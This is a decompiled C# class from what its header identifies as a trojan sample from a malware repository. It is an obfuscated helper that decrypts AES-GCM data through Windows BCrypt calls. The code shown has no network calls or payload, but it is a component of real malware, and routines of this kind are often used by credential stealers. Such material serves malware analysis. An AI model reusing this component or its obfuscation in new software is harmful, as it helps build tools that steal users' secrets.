// Decompiled with JetBrains decompiler
// Type: R�䇹j;.׉�ЦҏŎ
// Assembly: iJMJnUDAnLMGBkvrphkwZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BCFE5CC-61DE-4CD2-8DAF-2FBF230839CD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-3faa06bbade229a8aa4255134ad2bb94b129e470fbfc5ff6863adf68bc0280b9.exe

using \u07B9cƟR\uFFFD;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace R\uFFFD䇹j\u003B
{
  internal class \u05C9\uFFFDЦҏŎ
  {
    public byte[] \u06DA\u07B4蠺\u061DҚ(
      byte[] _param1,
      byte[] _param2,
      byte[] ߡ똛ήЅɮ,
      byte[] _param4,
      byte[] _param5)
    {
      IntPtr ŔױŔչל = this.\uFFFD嵱ᔖCՕ(\uF0B9ŧOľ\uF0B9.ל\uFFFD\uFFFD߂ջ, \uF0B9ŧOľ\uF0B9.ε\u060CӚ\u0609Ω, \uF0B9ŧOľ\uF0B9.\u0314ٵ\uFFFD嵱j);
      IntPtr num1;
      IntPtr hglobal = this.ľΩŴ\uFFFDҚ(ŔױŔչל, _param1, out num1);
      \uF0B9ŧOľ\uF0B9.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authenticatedCipherModeInfo = new \uF0B9ŧOľ\uF0B9.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(_param2, ߡ똛ήЅɮ, _param5);
      byte[] ߟRZΠۨ;
      using (authenticatedCipherModeInfo)
      {
        byte[] 嵱ŁЅéި = new byte[checked (this.\u00BE\u002D쐬\uFFFDA(ŔױŔչל) - 1 + 1)];
        int num2 = 0;
        uint num3 = \uF0B9ŧOľ\uF0B9.\u07A8ǎ\uFFFDƉӓ(num1, _param4, _param4.Length, ref authenticatedCipherModeInfo, 嵱ŁЅéި, 嵱ŁЅéި.Length, (byte[]) null, 0, ref num2, 0);
        if (num3 > 0U)
          throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", (object) num3));
        ߟRZΠۨ = new byte[checked (num2 - 1 + 1)];
        uint num4 = \uF0B9ŧOľ\uF0B9.\u07A8ǎ\uFFFDƉӓ(num1, _param4, _param4.Length, ref authenticatedCipherModeInfo, 嵱ŁЅéި, 嵱ŁЅéި.Length, ߟRZΠۨ, ߟRZΠۨ.Length, ref num2, 0);
        if ((int) num4 == (int) \uF0B9ŧOľ\uF0B9.\u0306\uFFFDҚ\uF0B9\uFFFD)
          throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
        if (num4 > 0U)
          throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", (object) num4));
      }
      int num5 = (int) \uF0B9ŧOľ\uF0B9.\u1CFCW\u002DŎB(num1);
      Marshal.FreeHGlobal(hglobal);
      int num6 = (int) \uF0B9ŧOľ\uF0B9.ک\uFFFDœ\uFFFD\uFFFD(ŔױŔչל, 0U);
      return ߟRZΠۨ;
    }

    private int \u00BE\u002D쐬\uFFFDA(IntPtr _param1)
    {
      byte[] numArray = this.\uFFFD\u07B4ҟ\u2964̆(_param1, \uF0B9ŧOľ\uF0B9.ϫ\uFFFD\uFFFD\u07B8ʭ);
      return BitConverter.ToInt32(new byte[4]
      {
        numArray[4],
        numArray[5],
        numArray[6],
        numArray[7]
      }, 0);
    }

    private IntPtr \uFFFD嵱ᔖCՕ(string _param1, string _param2, string _param3)
    {
      IntPtr zero = IntPtr.Zero;
      uint num1 = \uF0B9ŧOľ\uF0B9.\u07BB\u02E8t\u1CFC\u05C3(out zero, _param1, _param2, 0U);
      if (num1 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", (object) num1));
      byte[] bytes = Encoding.Unicode.GetBytes(_param3);
      uint num2 = \uF0B9ŧOľ\uF0B9.ג\u060Cş\uFFFD\u2964(zero, \uF0B9ŧOľ\uF0B9.Ò\uFFFDôã\uFFFD, bytes, bytes.Length, 0);
      if (num2 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", (object) num2));
      return zero;
    }

    private IntPtr ľΩŴ\uFFFDҚ(IntPtr ŔױŔչל, byte[] _param2, out IntPtr _param3)
    {
      int int32 = BitConverter.ToInt32(this.\uFFFD\u07B4ҟ\u2964̆(ŔױŔչל, \uF0B9ŧOľ\uF0B9.œ\u2964ЮΩݶ), 0);
      IntPtr num1 = Marshal.AllocHGlobal(int32);
      byte[] numArray = this.\u0332꾯\u07B4tę(\uF0B9ŧOľ\uF0B9.Òأ\uFFFDջ䕃, BitConverter.GetBytes(1), BitConverter.GetBytes(_param2.Length), _param2);
      uint num2 = \uF0B9ŧOľ\uF0B9.Ś̆ʤ\uFFFDᔖ(ŔױŔչל, IntPtr.Zero, \uF0B9ŧOľ\uF0B9.恁̱ҟ߂ɩ, out _param3, num1, int32, numArray, numArray.Length, 0U);
      if (num2 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", (object) num2));
      return num1;
    }

    private byte[] \uFFFD\u07B4ҟ\u2964̆(IntPtr _param1, string _param2)
    {
      int num1 = 0;
      uint num2 = \uF0B9ŧOľ\uF0B9.ߡչ\uDB8E\uDDCB\u0026(_param1, _param2, (byte[]) null, 0, ref num1, 0U);
      if (num2 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", (object) num2));
      byte[] numArray = new byte[checked (num1 - 1 + 1)];
      uint num3 = \uF0B9ŧOľ\uF0B9.ߡչ\uDB8E\uDDCB\u0026(_param1, _param2, numArray, numArray.Length, ref num1, 0U);
      if (num3 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", (object) num3));
      return numArray;
    }

    public byte[] \u0332꾯\u07B4tę(params byte[][] _param1)
    {
      int num = 0;
      byte[][] numArray1 = _param1;
      int index1 = 0;
      while (index1 < numArray1.Length)
      {
        byte[] numArray2 = numArray1[index1];
        if (numArray2 != null)
          checked { num += numArray2.Length; }
        checked { ++index1; }
      }
      byte[] dst = new byte[checked (num - 1 + 1 - 1 + 1)];
      int dstOffset = 0;
      byte[][] numArray3 = _param1;
      int index2 = 0;
      while (index2 < numArray3.Length)
      {
        byte[] src = numArray3[index2];
        if (src != null)
        {
          Buffer.BlockCopy((Array) src, 0, (Array) dst, dstOffset, src.Length);
          checked { dstOffset += src.Length; }
        }
        checked { ++index2; }
      }
      return dst;
    }
  }
}
